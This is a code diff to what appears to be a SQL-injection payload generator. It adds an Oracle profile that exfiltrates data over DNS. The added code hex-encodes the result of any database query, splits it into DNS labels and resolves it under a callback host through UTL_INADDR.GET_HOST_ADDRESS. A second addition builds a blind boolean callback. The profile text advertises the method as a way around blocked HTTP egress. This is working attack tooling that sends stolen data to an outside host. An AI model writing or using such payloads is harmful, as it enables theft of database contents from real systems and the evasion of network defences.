@@ -34,7 +34,7 @@ class Profile:
     def substring(self, expression: str, pos: int) -> str:
         if self.name in ("mssql", "mssql-cmdshell"):
             return f"SUBSTRING(({expression}),{pos},1)"
-        if self.name == "oracle-http":
+        if self.name in ("oracle-http", "oracle-dns"):
             return f"SUBSTR(({expression}),{pos},1)"
         return f"substr(({expression}),{pos},1)"
 
@@ -135,6 +135,17 @@ class Profile:
                 f"'.{host}/') FROM dual)||'"
             )
 
+        if self.name == "oracle-dns":
+            # Oracle: RAWTOHEX, split with SUBSTR + CASE, exfiltrated via DNS resolution
+            h = f"RAWTOHEX(UTL_RAW.CAST_TO_RAW(({expression})))"
+            split = (
+                f"SUBSTR({h},1,62)"
+                f"||CASE WHEN LENGTH({h})>62 THEN '.'||SUBSTR({h},63,62) ELSE '' END"
+                f"||CASE WHEN LENGTH({h})>124 THEN '.'||SUBSTR({h},125,62) ELSE '' END"
+                f"||CASE WHEN LENGTH({h})>186 THEN '.'||SUBSTR({h},187,62) ELSE '' END"
+            )
+            return f"{base}'||(SELECT UTL_INADDR.GET_HOST_ADDRESS({split}||'.{host}') FROM dual)||'"
+
         if self.name == "sqlite-http":
             h = f"hex(({expression}))"
             split = (
@@ -221,6 +232,11 @@ class Profile:
             return (
                 f"{base}'||(SELECT CASE WHEN {condition} "
                 f"THEN UTL_HTTP.REQUEST('http://{callback_host}/') ELSE '' END FROM dual)||'"
+            )
+        if self.name == "oracle-dns":
+            return (
+                f"{base}'||(SELECT CASE WHEN {condition} "
+                f"THEN UTL_INADDR.GET_HOST_ADDRESS('{callback_host}') ELSE '' END FROM dual)||'"
             )
         if self.name == "postgres-program":
             escaped = callback_host.replace("'", "'\"'\"'")
@@ -341,6 +357,12 @@ PROFILES = {
         "oracle-http",
         "Oracle UTL_HTTP callback",
         "Requires UTL_HTTP/network ACL access.",
+    ),
+    "oracle-dns": Profile(
+        "oracle-dns",
+        "Oracle UTL_INADDR.GET_HOST_ADDRESS DNS-only callback",
+        "Requires UTL_INADDR access; no UTL_HTTP/network ACL for HTTP needed "
+        "— useful when HTTP egress is blocked but DNS resolution is allowed.",
     ),
     "postgres-program": Profile(
         "postgres-program",
